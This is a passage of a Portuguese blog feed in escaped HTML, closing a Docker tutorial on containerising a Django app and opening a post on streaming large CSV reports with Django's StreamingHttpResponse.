    style=&quot;padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAKABQDASIAAhEBAxEB/8QAGAAAAwEBAAAAAAAAAAAAAAAAAAMEAgX/xAAVAQEBAAAAAAAAAAAAAAAAAAACA//aAAwDAQACEAMQAAABlXpNZ9IjEP/EABsQAAIBBQAAAAAAAAAAAAAAAAECAxAREiEy/9oACAEBAAEFAncscjZZNDmn/8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAwEBPwE//8QAFBEBAAAAAAAAAAAAAAAAAAAAEP/aAAgBAgEBPwE//8QAFxAAAwEAAAAAAAAAAAAAAAAAAAIQMf/aAAgBAQAGPwI2Nf/EABoQAQEAAgMAAAAAAAAAAAAAAAEAEXExocH/2gAIAQEAAT8hwUcG4LIepEt0PYji/9oADAMBAAIAAwAAABB4/wD/xAAWEQEBAQAAAAAAAAAAAAAAAAABABH/2gAIAQMBAT8QACy//8QAFhEBAQEAAAAAAAAAAAAAAAAAARAh/9oACAECAQE/EHWf/8QAHBABAAMAAgMAAAAAAAAAAAAAAQARITFBUWHB/9oACAEBAAE/ELGRLDF19hoZXtbFc7W+4C2tBT4xOUaCln//2Q==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;Escrever Dockerfile é tipo falar baleiês (insidethemagic.net)&amp;quot;&quot;
        title=&quot;Escrever Dockerfile é tipo falar baleiês (insidethemagic.net)&quot;
        src=&quot;/static/f70d10e197bf514f40c7912e834b89cb/c08c5/docker-dory-whale.jpg&quot;
        srcset=&quot;/static/f70d10e197bf514f40c7912e834b89cb/7809d/docker-dory-whale.jpg 192w,
/static/f70d10e197bf514f40c7912e834b89cb/4ecad/docker-dory-whale.jpg 384w,
/static/f70d10e197bf514f40c7912e834b89cb/c08c5/docker-dory-whale.jpg 640w&quot;
        sizes=&quot;(max-width: 640px) 100vw, 640px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;Escrever Dockerfile é tipo falar baleiês (insidethemagic.net)&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;No caso do comando &lt;code class=&quot;language-text&quot;&gt;COPY&lt;/code&gt;, passamos o arquivo &lt;code class=&quot;language-text&quot;&gt;requirements.txt&lt;/code&gt; da nossa &quot;máquina local&quot; para
o &lt;em&gt;container&lt;/em&gt;, assim o &lt;em&gt;Docker&lt;/em&gt; será capaz de encontrar o arquivo e realizar a instalação das dependências
através do comando &lt;code class=&quot;language-text&quot;&gt;pip&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Para finalizar, podemos copiar o resto do projeto e executar o servidor &lt;em&gt;WSGI&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;dockerfile&quot;&gt;&lt;pre class=&quot;language-dockerfile&quot;&gt;&lt;code class=&quot;language-dockerfile&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; python&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;3

&lt;span class=&quot;token keyword&quot;&gt;WORKDIR&lt;/span&gt; /usr/src/app

&lt;span class=&quot;token keyword&quot;&gt;COPY&lt;/span&gt; requirements.txt ./
&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; pip install &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;r requirements.txt

&lt;span class=&quot;token keyword&quot;&gt;COPY&lt;/span&gt; . .

&lt;span class=&quot;token keyword&quot;&gt;CMD&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;gunicorn&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;helloworld.wsgi:application&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;--bind=0.0.0.0:8000&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;--workers=3&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Comandos &lt;code class=&quot;language-text&quot;&gt;RUN&lt;/code&gt; serão executados em tempo de &lt;em&gt;build&lt;/em&gt;. São essenciais para a construção do ambiente,
e são responsáveis pelos &quot;layers&quot; discutidos nos &lt;em&gt;posts&lt;/em&gt; anteriores. Portanto é bem comum
vermos comandos como &lt;code class=&quot;language-text&quot;&gt;RUN apt-get dist-upgrade -y&lt;/code&gt;. Já o &lt;code class=&quot;language-text&quot;&gt;CMD&lt;/code&gt; será executado no momento que a sua
imagem for executada.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://goinbigdata.com/docker-run-vs-cmd-vs-entrypoint/&quot; title=&quot;Docker RUN vs CMD vs ENTRYPOINT&quot;&gt;Diferença entre &lt;code class=&quot;language-text&quot;&gt;RUN&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;CMD&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;ENTRYPONT&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;E se você está se perguntando o motivo de termos dois &lt;code class=&quot;language-text&quot;&gt;COPY&lt;/code&gt;, essa prática é útil para o mecanismo de &lt;em&gt;caching&lt;/em&gt;
do &lt;em&gt;Docker&lt;/em&gt; e invalidação do mesmo, como pode ser visto no &lt;a href=&quot;https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/#add-or-copy&quot; title=&quot;Dockerfile best practices&quot;&gt;guia de boas práticas&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;&quot;Build&quot; é quase BIRL!&lt;/h3&gt;
&lt;p&gt;Hora de &quot;buildar&quot;! Execute o seguinte comando:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ docker build -t &amp;lt;docker-hub-user&amp;gt;/helloworld-django-docker .&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Onde:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;build&lt;/code&gt;: É o comando para criar uma imagem &lt;em&gt;Docker&lt;/em&gt; a partir de um &lt;em&gt;Dockerfile&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;-t&lt;/code&gt;: O parâmetro &lt;code class=&quot;language-text&quot;&gt;-t&lt;/code&gt; é utilizado para nomear e tagear a imagem em questão.
É interessante usar o padrão &lt;code class=&quot;language-text&quot;&gt;&amp;lt;usuario-ou-repositorio&amp;gt;/nome-da-imagem&lt;/code&gt;;&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;.&lt;/code&gt;: O caminho onde encontra-se o &lt;em&gt;Dockerfile&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Se tudo der certo, será possível listar a imagem recém criada:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ docker images

REPOSITORY                         TAG    IMAGE ID
kplaube/helloworld-django-docker   latest b8d3b0c234a9&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Agora sim seremos capazes de executar a aplicação &lt;em&gt;Django&lt;/em&gt; através de um &lt;em&gt;container&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ docker run -it -p 8000:8000 &amp;lt;docker-hub-user&amp;gt;/helloworld-django-docker&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;E mais uma vez seremos capazes de ver o &quot;It worked!&quot; em &lt;code class=&quot;language-text&quot;&gt;http://localhost:8000&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Belezura! Uma vez que a imagem esteja ok, podemos publicá-la no &lt;em&gt;Docker Hub&lt;/em&gt; (afinal,
propaganda é a alma do negócio):&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ docker push &amp;lt;docker-hub-user&amp;gt;/helloworld-django-docker&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;E... &lt;em&gt;voilá&lt;/em&gt;! A imagem foi publicada no &lt;a href=&quot;https://hub.docker.com/r/kplaube/helloworld-django-docker/&quot;&gt;&lt;em&gt;Docker Hub&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Antes de ir: Efêmero&lt;/h3&gt;
&lt;p&gt;Nos &lt;em&gt;posts&lt;/em&gt; anteriores demos uma pincelada numa das características dos &lt;em&gt;containers&lt;/em&gt;
que é a sua &quot;efemeridade&quot;. Isso significa que, a cada nova versão da sua &lt;em&gt;app Django&lt;/em&gt;
você terá que &quot;buildar&quot; uma nova versão da imagem &lt;em&gt;Docker&lt;/em&gt;. A boa notícia é que com
o mecanismo de &lt;em&gt;caching&lt;/em&gt; do &lt;em&gt;Docker&lt;/em&gt; essa operação deverá ser ligeiramente mais
rápida do que da primeira vez.&lt;/p&gt;
&lt;p&gt;Além disso, mesmo que você tenha uma leve camada de escrita ao executar um &lt;em&gt;container&lt;/em&gt;,
a informação será perdida ao parar/reiniciar o mesmo. Portanto, o uso de &lt;a href=&quot;https://docs.docker.com/engine/admin/volumes/volumes/&quot; title=&quot;Use volumes&quot;&gt;&lt;em&gt;Docker Volumes&lt;/em&gt;&lt;/a&gt;
é essencial quando se faz necessária a persistência de dados.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Com esse &lt;em&gt;post&lt;/em&gt; fechamos essa pequena ode ao &lt;em&gt;Docker&lt;/em&gt;. Sem dúvida, uma ferramenta que vem mudando
paradigmas (o mais recente deles com o &lt;a href=&quot;https://www.opencontainers.org/announcement/2017/07/19/open-container-initiative-oci-releases-v1-0-of-container-standards&quot; title=&quot;Open Container Initiative (OCI) Releases v1.0 of Container Standards&quot;&gt;lançamento da versão 1.0&lt;/a&gt; do &lt;em&gt;Container Standards&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Pretendo abordar mais sobre &lt;em&gt;Docker&lt;/em&gt; aqui no &lt;em&gt;blog&lt;/em&gt;, principalmente detalhando melhor
o uso do mesmo no &lt;a href=&quot;/tag/deploy.html&quot; title=&quot;Leia mais sobre deploy&quot;&gt;&lt;em&gt;deploy&lt;/em&gt;&lt;/a&gt; de aplicações &lt;em&gt;Django&lt;/em&gt;.
Com a adoção de conteinerização por serviços &lt;em&gt;PaaS&lt;/em&gt; como &lt;em&gt;Heroku&lt;/em&gt; e &lt;em&gt;Openshift&lt;/em&gt;,
há muito assunto a ser explorado nessa seara.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.docker.com/engine/userguide/eng-image/dockerfile_best-practices/&quot;&gt;Docker Docs - Best practices for writing Dockerfiles&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://flaviosilveira.com/2017/criando-seu-container-com-dockerfile/&quot;&gt;Flavio Silveira - Criando Seu Container Com Dockerfile&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.mundodocker.com.br/o-que-e-dockerfile/&quot;&gt;Mundo Docker - O que é Dockerfile&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.patricksoftwareblog.com/how-to-use-docker-and-docker-compose-to-create-a-flask-application/&quot;&gt;Patrick&apos;s Software Blog - How to use Docker and Docker Compose to Create a Flask Application&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://semaphoreci.com/community/tutorials/dockerizing-a-python-django-web-application&quot;&gt;Semaphore - Dockerizing a Python Django web Application&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Streamando dados no Django]]></title><description><![CDATA[Recentemente na Loadsmart,
houve a necessidade de lidar com um cenário onde se faz necessário acessar uma view
que retorna um CSV de tamanho considerável, gerado a partir de parâmetros dinâmicos,
no melhor esquema "imprima um relatório". Embora o Django seja desenhado para requisições curtas, existe…]]></description><link>https://klauslaube.com.br/2017/05/14/streaming-dados-django.html</link><guid isPermaLink="false">https://klauslaube.com.br/2017/05/14/streaming-dados-django.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Sun, 14 May 2017 15:45:00 GMT</pubDate><content:encoded>&lt;p&gt;Recentemente na &lt;a href=&quot;http://loadsmart.com/&quot; title=&quot;Book a truck with Loadsmart&quot;&gt;&lt;em&gt;Loadsmart&lt;/em&gt;&lt;/a&gt;,
houve a necessidade de lidar com um cenário onde se faz necessário acessar uma &lt;em&gt;view&lt;/em&gt;
que retorna um &lt;em&gt;CSV&lt;/em&gt; de tamanho considerável, gerado a partir de parâmetros dinâmicos,
no melhor esquema &quot;imprima um relatório&quot;.&lt;/p&gt;
&lt;p&gt;Embora o &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; seja desenhado para requisições curtas, existe a possibilidade
de fazer &lt;em&gt;streaming&lt;/em&gt; de grandes arquivos &lt;em&gt;CSVs&lt;/em&gt; através da classe &lt;code class=&quot;language-text&quot;&gt;StreamingHttpResponse&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Vale a nota: Esse artigo é sobre &lt;em&gt;CSVs&lt;/em&gt;, mas você também pode &lt;a href=&quot;http://stackoverflow.com/questions/30791228/serving-a-django-static-text-file&quot; title=&quot;Serving a django static text file&quot;&gt;&quot;streamar&quot; outros tipos de dados&lt;/a&gt;
através desse método supimpa.&lt;/p&gt;
&lt;h2&gt;Motivação&lt;/h2&gt;
&lt;p&gt;Em determinados cenários, precisamos retornar arquivos relativamente grandes para
o usuário. O exemplo acima, uma requisição com parâmetros que irão gerar um relatório
em &lt;em&gt;CSV&lt;/em&gt;, é um caso bem comum.&lt;/p&gt;
&lt;p&gt;O comportamento de resposta padrão do &lt;em&gt;Django&lt;/em&gt; é retornar uma instância de &lt;code class=&quot;language-text&quot;&gt;HttpResponse&lt;/code&gt;.
O problema é que nesse modo carregaremos o arquivo inteiro para a memória do
servidor, e só depois enviamos o arquivo para o cliente. Além de prejudicarmos o &lt;em&gt;Time To
First Byte&lt;/em&gt; (TTBT), podemos gerar picos de memória na máquina hospedeira (que podem afetar
demais requisições sendo processadas) e &lt;em&gt;timeouts&lt;/em&gt; de conexão.&lt;/p&gt;
&lt;p&gt;Um exemplo de como faríamos esse retorno através do &lt;code class=&quot;language-text&quot;&gt;HttpResponse&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; csv
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;http &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; HttpResponse
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;view &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; View


&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;CsvReportView&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;View&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; request&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;**&lt;/span&gt;kwargs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;# Abstraindo a logica de filtro por parametros do request&lt;/span&gt;
        cargoes &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Cargoes&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;filter_by_request_parms&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

        response &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; HttpResponse&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;content_type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;text/csv&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        response&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;Content-Disposition&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;attachment; filename=&quot;filtered_cargoes.csv&quot;&apos;&lt;/span&gt;

        writer &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; csv&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;writer&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;response&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; row &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; cargoes&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;values_list&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;id&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;commodity&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;weight&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
            writer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;writerow&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;row&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; response&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Se você tem certa intimidade com geradores, deve estar supondo que essa pode ser uma
maneira de solucionar esse problema... e você está certo!&lt;/p&gt;
&lt;h2&gt;Como funciona o StreamingHttpResponse?&lt;/h2&gt;
&lt;p&gt;O &lt;code class=&quot;language-text&quot;&gt;StreamingHttpResponse&lt;/code&gt; funciona com a ajuda do conceito de &lt;em&gt;generators&lt;/em&gt;. Achei
uma excelente definição no &lt;a href=&quot;http://stackoverflow.com/questions/1756096/understanding-generators-in-python&quot; title=&quot;Understanding Generators in Python&quot;&gt;&lt;em&gt;Stackoverflow&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) is simply a function which returns an object on which you can
call next, such that for every call it returns some value, until it raises
a StopIteration exception, signaling that all values have been generated.
Such an object is called an iterator.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.slideshare.net/ramalho/iteraveis-e-geradores-em-python&quot; title=&quot;Iteraveis e geradores em Python&quot;&gt;Leia mais sobre iteráveis e geradores&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Para tanto, o uso da palavra reservada &lt;code class=&quot;language-text&quot;&gt;yield&lt;/code&gt; se faz necessário. Logo, ao invés de termos o exemplo abaixo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;my_view&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    message &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;Hello, there!&apos;&lt;/span&gt;
    response &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;  HttpResponse&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    response&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;Content-Length&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; response&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Teremos:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;Hello,&apos;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;there!&apos;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;my_view&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; StreamingHttpResponse&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;hello&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://andrewbrookins.com/django/how-does-djangos-streaminghttpresponse-work-exactly/&quot; title=&quot;How does Django’s StreamingHttpResponse work, exactly&quot;&gt;Leia mais no excelente &quot;How does Django&apos;s StreamingHttpResponse work, exactly?&quot;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Voltando ao exemplo do &lt;em&gt;CSV&lt;/em&gt;, teremos:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; csv
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;db &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; models
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;http &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; StreamingHttpResponse
&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;views&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;generic &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; View

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Echo&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token triple-quoted-string string&quot;&gt;&quot;&quot;&quot;
    Interface parecida com a que usamos para escrever arquivos.
    &quot;&quot;&quot;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; value&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; value


&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;CsvReportView&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;View&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; request&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;args&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;**&lt;/span&gt;kwargs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;# Abstraindo a logica de filtro por parametros do request&lt;/span&gt;
        cargoes &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Cargoes&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;filter_by_request_parms&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;request&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;token comment&quot;&gt;# Usamos a mesma interface de buffer utilizada para escrever&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;# um arquivo. No entanto, apenas damos um `return value`&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;# aos inves de persistirmos o valor&lt;/span&gt;
        pseudo_buffer &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; Echo&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
